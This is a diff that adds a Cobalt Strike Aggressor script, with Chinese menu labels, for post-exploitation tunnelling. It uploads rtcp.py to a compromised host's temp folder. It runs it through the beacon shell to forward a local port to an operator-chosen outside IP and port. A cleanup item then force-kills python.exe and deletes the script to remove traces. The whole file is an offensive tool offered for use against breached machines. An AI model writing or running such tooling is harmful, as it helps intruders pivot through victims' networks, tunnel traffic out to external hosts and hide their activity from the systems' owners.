@@ -1,0 +1,38 @@
+menu "Rtcp" {
+	item "上传Rtcp" {
+		$bid = $1;
+		$dialog = dialog("上传Rtcp", %(UploadPath => "C:\\Windows\\Temp\\", bid => $bid), &rtcp);
+		drow_text($dialog, "UploadPath",  "上传路径: "); 	
+		dbutton_action($dialog, "上传");
+		dialog_show($dialog);
+	}
+	sub rtcp {
+	    bcd($bid, $3['UploadPath']);
+        bupload($bid, script_resource("/script/rtcp/rtcp.py"));
+	}
+    
+	item "运行Rtcp"{
+		$bid = $1['@'];
+	    $Dialog = dialog("运行Rtcp", %(ip => "", port => "",bid => $bid),&rtcp_run);
+	    drow_text($Dialog, "ip", "ip: ");
+	    drow_text($Dialog, "port", "port: ");
+	    drow_text($Dialog, "port1", "目标port: ");
+	    dbutton_action($Dialog, "运行");
+	    dialog_show($Dialog);
+	}
+	sub rtcp_run{
+	    local('$Name $port');
+	    $Name = $3['ip'];
+	    $port = replace($3['port'], "\"", "");
+	    $port1 = replace($3['port1'], "\"", "");
+		bshell($bid, "python rtcp.py c:127.0.0.1: $+ $port1 c: $+ $Name\: $+ $port");
+	}
+
+	item "删除Rtcp"{
+		local('$bid');
+		foreach $bid ($1){
+			bshell($1, "TASKKILL /F /IM python.exe");
+			bshell($1, "del /f /s /q rtcp.py");
+		}
+	}
+}
